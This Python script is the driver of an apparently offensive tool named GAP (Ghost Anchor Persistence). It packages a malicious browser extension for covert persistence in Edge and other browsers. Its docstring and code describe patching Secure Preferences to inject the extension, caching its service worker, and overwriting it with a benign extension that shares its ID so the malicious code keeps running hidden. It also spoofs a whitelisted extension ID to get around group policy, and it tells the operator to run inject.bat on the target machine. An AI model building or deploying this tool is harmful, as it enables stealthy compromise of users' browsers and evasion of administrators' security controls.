#!/usr/bin/env python3
"""
gap.py - GAP (Ghost Anchor Persistence) deployment tool

Builds a deployment ZIP that reproduces the GAP infection chain on the target:

  1. Inject a malicious extension (A) via Secure Preferences.
  2. Open/close the browser -> A's service worker is cached in ScriptCache.
  3. Stomp over it with a benign extension (B) sharing the same ID.
  4. Remove A's folder -> only B remains on disk, A's JS keeps running.

Both extensions MUST share the same extension ID (same `key` in manifest.json).
This is enforced automatically: --spoof patches both, otherwise a shared key is generated / propagated.

Usage
-----
# Basic injection (fresh shared ID generated)
python3 gap.py --malicious EXT_A/ --benign EXT_B/ \
    --prefs-file SecurePreferences \
    --device-id "S-1-5-21-...-...-...-..." \
    --target-dir "C:\\Users\\USER\\AppData\\Local" \
    --browser edge

# GPO bypass - spoof a whitelisted extension ID (applied to BOTH A and B)
python3 gap.py --malicious EXT_A/ --benign EXT_B/ \
    --spoof nmhdhpibnnopknkmonacoephklnflpho \
    --prefs-file SecurePreferences \
    --device-id "S-1-5-21-...-...-...-..." \
    --target-dir "C:\\Users\\USER\\AppData\\Local" \
    --browser edge

Output ZIP layout
-----------------
gap_<ID>_<timestamp>_deploy.zip
    - extension_malicious/   <- malicious extension A
    - extension_benign/      <- benign extension B (same ID)
    - "Secure Preferences A" <- patched file -> A's folder
    - "Secure Preferences B" <- patched file -> B's folder
    - SecurePreferencesClean  <- backup of the original Secure Preferences
    - inject.bat              <- two-phase automated deployment script
    - info.json               <- metadata
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from utils.browser_config import BrowserConfigurator
from utils.gap_package import gap_package, resolve_shared_key


def main() -> None:
    parser = argparse.ArgumentParser(
        description="gap.py - GAP (Ghost Anchor Persistence) deployment tool",
    )
    parser.add_argument(
        "--malicious",
        required=True,
        help="Malicious extension folder (A) - must contain manifest.json",
    )
    parser.add_argument(
        "--benign",
        required=True,
        help="Benign extension folder (B) - must contain manifest.json, same ID as A",
    )
    parser.add_argument(
        "--spoof",
        metavar="EXTENSION_ID",
        default=None,
        help="Extension ID to spoof (fetches its public key, applied to BOTH extensions)",
    )
    parser.add_argument("--prefs-file", required=True,
                        help="Path to the target Secure Preferences file")
    parser.add_argument("--device-id", required=True,
                        help="Target user's Windows SID or hardware UUID for Linux/macOS")
    parser.add_argument("--target-dir", required=True,
                        help=r"Deployment root on target (e.g. C:\Users\X\AppData\Local)")
    parser.add_argument("--platform",
                        choices=["windows", "linux", "darwin"],
                        default="windows",
                        help="Target platform (default: windows)")
    parser.add_argument("--browser",
                        choices=list(BrowserConfigurator.get_browser_configs().keys()),
                        default="edge",
                        help="Target browser (default: edge)")
    parser.add_argument("--proxy",
                        default=None,
                        help="HTTP/HTTPS proxy URL for fetching the CRX from the store")
    parser.add_argument("--output", default=None,
                        help="Output directory for the deployment ZIP (default: current directory)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable verbose debug output")
    args = parser.parse_args()

    print(f"\n{'=' * 60}")
    print("  gap.py - GAP (Ghost Anchor Persistence) Tool")
    print(f"{'=' * 60}\n")

    # Step 1: guarantee a single shared extension ID across A and B
    print("[1/2] Resolving shared extension ID ...")
    crx_id, _pub_key = resolve_shared_key(
        malicious_dir=args.malicious,
        benign_dir=args.benign,
        spoof_id=args.spoof,
        browser=args.browser,
        proxy=args.proxy,
    )
    if not crx_id:
        print("[-] Could not resolve a shared extension ID - aborting.")
        sys.exit(1)

    # Step 2: build the two-phase deployment package
    print(f"\n[2/2] Building GAP deployment package ...")
    result = gap_package(
        malicious_dir=args.malicious,
        benign_dir=args.benign,
        crx_id=crx_id,
        prefs_file=args.prefs_file,
        device_id=args.device_id,
        target_dir=args.target_dir,
        browser_id=args.browser,
        platform=args.platform,
        output_dir=args.output,
        debug=args.debug,
    )

    if not result:
        print("\n[-] Package creation failed.")
        sys.exit(1)

    print("\n[+] Done.")
    script = "inject.bat" if args.platform == "windows" else "inject.sh"
    print(f"[*] Extract the _deploy.zip on the target machine and run {script}")
    print("[*] The script injects A, caches its worker, then stomps over it with B.")


if __name__ == "__main__":
    main()
